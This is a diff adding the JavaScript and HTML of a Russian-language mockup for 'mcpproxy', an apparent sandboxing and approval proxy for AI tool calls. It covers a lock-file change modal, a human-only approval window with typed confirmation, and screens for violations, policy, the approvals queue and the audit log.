+  return `<div class="overlay"><div class="modal" role="dialog" aria-modal="true"
+      aria-labelledby="lockh">
+    <div class="modal-head">
+      <h2 id="lockh">Определение рецепта изменилось</h2>
+      <p><span class="mono">analyze_logs</span> отличается от того, что записано в
+        <span class="mono">mcpproxy.lock</span>. Пока изменение не подтверждено, рецепт не работает.</p>
+    </div>
+    <div class="modal-body">
+      <div class="slot"><span class="eyebrow">Изменено</span>
+        <div class="diff">
+          <div class="was"><span class="m">−</span>exec: ["./scripts/analyze-logs.sh"]</div>
+          <div class="is"><span class="m">+</span>exec: ["./scripts/analyze-logs.sh", "--upload"]</div>
+        </div>
+      </div>
+      <div class="slot"><span class="eyebrow">Добавлено</span>
+        <p class="slot-empty">Ничего не добавлено.</p>
+      </div>
+      <div class="slot"><span class="eyebrow">Удалено</span>
+        <p class="slot-empty">Ничего не удалено.</p>
+      </div>
+      <div class="slot"><span class="eyebrow">Изменены значения по умолчанию</span>
+        <p class="slot-empty">Значения по умолчанию не менялись.</p>
+      </div>
+    </div>
+    <div class="modal-foot">
+      <span class="spacer"></span>
+      <button class="btn-primary" type="button" data-close>Оставить запрет</button>
+      <button class="btn-secondary" type="button" data-close>Принять изменение</button>
+    </div>
+  </div></div>`;
+}
+
+/* Срок показывается абсолютным временем — но только тогда, когда оно
+   действительно существует. «До конца этого вызова» таймера не имеет, и
+   печатать рядом с ним конкретное время значит учить неверному. */
+/* Три значения — ровно те, что объявляет замороженный `ApprovalScope`:
+   once, until, recipe_and_args. Две независимые оси «область × срок» пришли
+   из prior art и читаются лучше, но союз выражает ширину одним значением, и
+   E5 ключует разрешения именно по нему: «только этот вызов на десять минут»
+   пришлось бы отобразить в `until`, выбросив ограничение области и выдав
+   грант шире показанного человеку. */
+const TTL_ABS = {
+  once: 'Действует только на этот вызов. Следующий спросит снова.',
+  until: 'Истекает 27.08.2026, 14:32:07 — время абсолютное, не «десять минут от чего-то».',
+  recipe_and_args: 'Действует, пока команда и её аргументы те же. Изменится хоть один — спросит снова.',
+};
+
+function renderApprovalWindow() {
+  const token = 'v2.4.0';
+  const ready = S.typed === token;
+  return `<div class="winshade"><div class="win" role="dialog" aria-modal="true" aria-labelledby="apph">
+    <div class="win-title"><span class="dots"><i></i><i></i><i></i></span>
+      mcpproxy — подтверждение · отдельное окно, вне контекста модели</div>
+    <div class="win-body">
+      <h2 id="apph">Разрешить <span class="mono">publish_release</span>?</h2>
+      <p class="win-why">Рецепт объявлен разрушительным и выходящим во внешний мир, поэтому
+        подтвердить его может только человек и только здесь. Запрос модели через
+        <span class="mono">elicitation/create</span> отклонён: этот канал проходит через саму модель.</p>
+
+      <div class="dsec"><span class="eyebrow">Команда целиком</span>
+        <div class="argvlist">
+          <span class="i">0</span><span class="v">./scripts/publish.sh</span>
+          <span class="i">1</span><span class="v tok">v2.4.0</span>
+        </div>
+        <p class="argv-legend">По элементу на строку: команда длиннее экрана уехала бы
+          в горизонтальный скролл, и подтвердить её можно было бы, не увидев хвоста.</p>
+      </div>
+      <div class="dsec">
+        <dl class="kv">
+          <dt>рабочий каталог</dt><dd class="mono">/Users/y/work/demo-repo</dd>
+          <dt>песочница</dt><dd><span class="badge badge--ok">seatbelt</span></dd>
+          <dt>сеть разрешена</dt><dd class="mono">registry.npmjs.org, api.github.com</dd>
+          <dt>запись</dt><dd>не разрешена</dd>
+          <dt>хэш аргументов</dt><dd class="mono">4c1e9a77b3…</dd>
+        </dl>
+      </div>
+
+      <div class="confirm">
+        <label for="tok">Чтобы разрешить, наберите тег из команды выше. Вставка отключена.</label>
+        <input id="tok" type="text" autocomplete="off" spellcheck="false"
+          placeholder="наберите тег" value="${esc(S.typed)}">
+        <p class="hint${ready ? ' ready' : ''}">${ready
+          ? 'Совпало. Кнопка «Разрешить» разблокирована.'
+          : 'Отказать можно сразу — набор нужен только чтобы разрешить.'}</p>
+
+        <div class="scopes">
+          <span>Насколько широко</span>
+          <select id="ttl">
+            <option value="once">разрешить один раз</option>
+            <option value="until">на 10 минут</option>
+            <option value="recipe_and_args">всегда для этого рецепта и этого хэша аргументов</option>
+          </select>
+          <span></span>
+          <span class="abs">${TTL_ABS[S.ttl]}</span>
+        </div>
+      </div>
+    </div>
+    <div class="win-foot">
+      <span class="spacer"></span>
+      <button class="btn-secondary" type="button" data-close>Отказать</button>
+      <button class="btn-primary" type="button" ${ready ? '' : 'disabled'}>Разрешить</button>
+    </div>
+  </div></div>`;
+}
+
+const SCREENS = {
+  timeline: () => `<div class="main">
+      <section class="pane pane-list" aria-label="Вызовы">
+        <div class="pane-head"><h2>Вызовы</h2>
+          <span class="spacer"></span>
+          ${S.filter ? `<span class="badge badge--muted">фильтр: ${esc(S.filter)}</span>` : ''}
+          <span class="eyebrow">${S.loading ? 'загружаем…' : `${S.empty ? 0 : CALLS.length} за сессию`}</span></div>
+        <div class="pane-scroll" role="listbox">${renderCallList()}</div>
+      </section>
+      <section class="pane pane-detail" aria-label="Детали вызова">
+        <div class="pane-head"><h2>Детали вызова</h2></div>
+        ${S.loading ? renderDetailSkeleton()
+          : S.empty ? `<div class="empty"><b>Вызов не выбран</b>
+              Выберите строку слева, чтобы увидеть стадии, команду и профиль песочницы.</div>`
+          : renderDetail()}
+      </section>
+    </div>`,
+  violations: () => `<div class="main"><section class="pane" style="flex:1" aria-label="Нарушения песочницы">
+      <div class="pane-head"><h2>Нарушения песочницы</h2><span class="spacer"></span>
+        <span class="eyebrow">янтарь — отбито · красный — прошло или попытка закрепиться</span></div>
+      <div class="pane-scroll">${renderViolations()}</div></section></div>`,
+  policy: () => `<div class="main"><section class="pane" style="flex:1" aria-label="Политика">
+      <div class="pane-head"><h2>Политика</h2><span class="spacer"></span>
+        <span class="eyebrow">4 инструмента · строки команд модели не видны</span></div>
+      <div class="pane-scroll">${renderPolicy()}</div></section></div>`,
+  approvals: () => `<div class="main"><section class="pane" style="flex:1" aria-label="Апрувы">
+      <div class="pane-head"><h2>Апрувы</h2><span class="spacer"></span>
+        <span class="eyebrow">решение принимается в отдельном окне</span></div>
+      <div class="pane-scroll">${
+        S.empty || !PENDING.length
+          ? `<div class="empty"><b>Очередь пуста</b>
+              Здесь появится вызов, который прокси не может разрешить сам. Решение по нему
+              принимается в отдельном окне — эта страница только показывает очередь.</div>`
+          : PENDING.map((r) => `<div class="pending">
+              <div class="pending-top">
+                <span class="tool-name">${esc(r.recipeName)}</span>
+                <span class="badge badge--danger">риск ${riskLabel[r.tier]}</span>
+                <span class="badge badge--info">ждёт ${esc(r.waiting)}</span>
+              </div>
+              <div class="argvbox">${r.argv.map((a) => esc(a)).join(' ')}</div>
+              <div class="pending-foot">
+                <span class="chain-anchor">сессия ${esc(r.session)} · запрос ${esc(r.requestId)}</span>
+                <span class="spacer"></span>
+                <button class="btn-primary" type="button" data-overlay="approval"
+                  style="padding:6px 16px">Открыть подтверждение</button>
+              </div>
+            </div>`).join('')
+      }</div></section></div>`,
+  audit: () => `<div class="main"><section class="pane" style="flex:1" aria-label="Аудит">
+      <div class="pane-head"><h2>Аудит</h2><span class="spacer"></span>
+        <button class="btn-secondary" type="button" style="padding:4px 12px">Экспорт JSONL</button></div>
+      <div class="pane-scroll">${renderAudit()}</div></section></div>`,
+};
+
+/* Счётчик не имеет права утверждать «8 вызовов», пока список грузится или
+   пуст: слева цифра, справа «вызовов пока не было» — это ошибка, а не деталь. */
+const NAV = [
+  ['timeline','Таймлайн', () => S.loading ? '—' : S.empty ? 0 : CALLS.length],
+  ['violations','Нарушения', () => S.loading ? '—' : S.empty ? 0
+      : CALLS.reduce((n,c) => n + (c.violations || []).length, 0)],
+  ['policy','Политика', () => TOOLS.length],
+  ['approvals','Апрувы', () => S.empty ? 0 : PENDING.length],
+  ['audit','Аудит', () => S.loading ? '—' : S.empty ? 0 : 1284],
+];
+
+function render() {
+  const app = document.getElementById('app');
+  app.innerHTML = `
+    ${S.mode === 'none' ? `<div class="unsandboxed-banner">
+      Песочница выключена — baseline. Всё, что запустит вызов, выполняется с вашими правами.</div>` : ''}
+    <header class="chrome">
+      <span class="logo"><span class="mark"></span>mcpproxy</span>
+      <span class="spacer"></span>
+      <span class="eyebrow">песочница</span>
+      <div class="modeswitch" role="group" aria-label="Режим песочницы">
+        <button type="button" data-mode="none" aria-pressed="${S.mode === 'none'}">без песочницы</button>
+        <button type="button" data-mode="seatbelt" aria-pressed="${S.mode === 'seatbelt'}">seatbelt</button>
+      </div>
+    </header>
+    <div class="body">
+      <nav class="nav" aria-label="Разделы">
+        ${NAV.map(([id,label,count]) => `<button type="button" data-screen="${id}"
+          ${S.screen === id ? 'aria-current="page"' : ''}>${label}
+          <span class="count">${count()}</span></button>`).join('')}
+        <div class="nav-sep"></div>
+        <button type="button" data-overlay="lock">Показать дифф lock</button>
+        <button type="button" data-overlay="approval">Показать окно апрува</button>
+      </nav>
+      ${SCREENS[S.screen]()}
+    </div>
+    ${S.overlay === 'lock' ? renderLockModal() : ''}
+    ${S.overlay === 'approval' ? renderApprovalWindow() : ''}`;
+
+  app.querySelectorAll('[data-screen]').forEach((b) =>
+    b.onclick = () => { S.screen = b.dataset.screen; render(); });
+  app.querySelectorAll('[data-mode]').forEach((b) =>
+    b.onclick = () => { S.mode = b.dataset.mode; S.sel = b.dataset.mode === 'none' ? 'c6' : 'c7'; render(); });
+  app.querySelectorAll('[data-call]').forEach((b) =>
+    b.onclick = () => { S.sel = b.dataset.call; render(); });
+  app.querySelectorAll('[data-overlay]').forEach((b) =>
+    b.onclick = () => { S.overlay = b.dataset.overlay; S.typed = ''; render(); });
+  app.querySelectorAll('[data-close]').forEach((b) =>
+    b.onclick = () => { S.overlay = null; render(); });
+  app.querySelectorAll('.chipfilter').forEach((b) =>
+    b.onclick = () => { S.filter = b.textContent.trim(); S.screen = 'timeline'; render(); });
+  const ttlSel = app.querySelector('#ttl');
+  if (ttlSel) { ttlSel.value = S.ttl; ttlSel.onchange = () => { S.ttl = ttlSel.value; render(); }; }
+  const tok = app.querySelector('#tok');
+  if (tok) {
+    tok.oninput = (e) => { S.typed = e.target.value; const p = tok.selectionStart; render();
+      const t2 = document.getElementById('tok'); t2.focus(); t2.setSelectionRange(p, p); };
+    tok.onpaste = (e) => e.preventDefault();
+  }
+}
+
+/* ═══ Контракт состояний для аудитора ═══════════════════════════════════ */
+const STATES = {
+  'timeline-default':        { screen:'timeline', mode:'seatbelt', sel:'c7' },
+  'timeline-baseline-none':  { screen:'timeline', mode:'none', sel:'c6' },
+  'timeline-denied-validate':{ screen:'timeline', mode:'seatbelt', sel:'c2' },
+  'timeline-denied-paths':   { screen:'timeline', mode:'seatbelt', sel:'c3' },
+  'timeline-denied-lock':    { screen:'timeline', mode:'seatbelt', sel:'c5' },
+  'timeline-mandatory-deny': { screen:'timeline', mode:'seatbelt', sel:'c8' },
+  'timeline-pending':        { screen:'timeline', mode:'seatbelt', sel:'c9' },
+  'timeline-loading':        { screen:'timeline', mode:'seatbelt', loading:true },
+  'timeline-empty':          { screen:'timeline', mode:'seatbelt', empty:true },
+  'violations-default':      { screen:'violations', mode:'seatbelt' },
+  'violations-empty':        { screen:'violations', mode:'seatbelt', empty:true },
+  'policy-default':          { screen:'policy', mode:'seatbelt' },
+  'approvals-default':       { screen:'approvals', mode:'seatbelt' },
+  'approvals-empty':         { screen:'approvals', mode:'seatbelt', empty:true },
+  'audit-selfconsistent':    { screen:'audit', mode:'seatbelt' },
+  'audit-broken':            { screen:'audit', mode:'seatbelt', chainBroken:true },
+  'lock-diff-modal':         { screen:'timeline', mode:'seatbelt', sel:'c5', overlay:'lock' },
+  'approval-window':         { screen:'timeline', mode:'seatbelt', sel:'c9', overlay:'approval' },
+  'approval-window-typed':   { screen:'timeline', mode:'seatbelt', sel:'c9', overlay:'approval', typed:'v2.4.0' },
+};
+const LABELS = {
+  'timeline-default':'Таймлайн · разрешено',
+  'timeline-baseline-none':'Таймлайн · baseline без песочницы',
+  'timeline-denied-validate':'Таймлайн · отказ на валидации',
+  'timeline-denied-paths':'Таймлайн · отказ на резолве путей',
+  'timeline-denied-lock':'Таймлайн · отказ на сверке lock',
+  'timeline-mandatory-deny':'Таймлайн · persistence',
+  'timeline-pending':'Таймлайн · ждёт апрува',
+  'timeline-loading':'Таймлайн · загрузка',
+  'timeline-empty':'Таймлайн · пусто',
+  'violations-default':'Нарушения',
+  'violations-empty':'Нарушения · пусто',
+  'policy-default':'Политика',
+  'approvals-default':'Апрувы · очередь',
+  'approvals-empty':'Апрувы · пусто',
+  'audit-selfconsistent':'Аудит · самосогласована',
+  'audit-broken':'Аудит · цепочка разошлась',
+  'lock-diff-modal':'Модалка диффа lock',
+  'approval-window':'Окно апрува',
+  'approval-window-typed':'Окно апрува · тег набран',
+};
+window.__listStates = () => Object.keys(STATES).map((id) => ({ id, label:LABELS[id], viewport:'desktop' }));
+window.__setState = (id) => {
+  const base = { screen:'timeline', mode:'seatbelt', sel:'c7', overlay:null,
+                 loading:false, empty:false, chainBroken:false, typed:'', filter:null, ttl:'once' };
+  Object.assign(S, base, STATES[id] || {});
+  render();
+  const sel = document.getElementById('stateSel');
+  if (sel) sel.value = id;
+};
+window.__setTheme = (t) => document.documentElement.setAttribute('data-theme', t);
+
+const sel = document.getElementById('stateSel');
+sel.innerHTML = window.__listStates().map((s) => `<option value="${s.id}">${s.label}</option>`).join('');
+sel.onchange = () => window.__setState(sel.value);
+document.getElementById('themeBtn').onclick = () => {
+  const cur = document.documentElement.getAttribute('data-theme');
+  window.__setTheme(cur === 'dark' ? 'light' : 'dark');
+};
+if (new URLSearchParams(location.search).get('mode') === 'raw') document.body.classList.add('raw');
+render();
+</script>
+</body>
+</html>
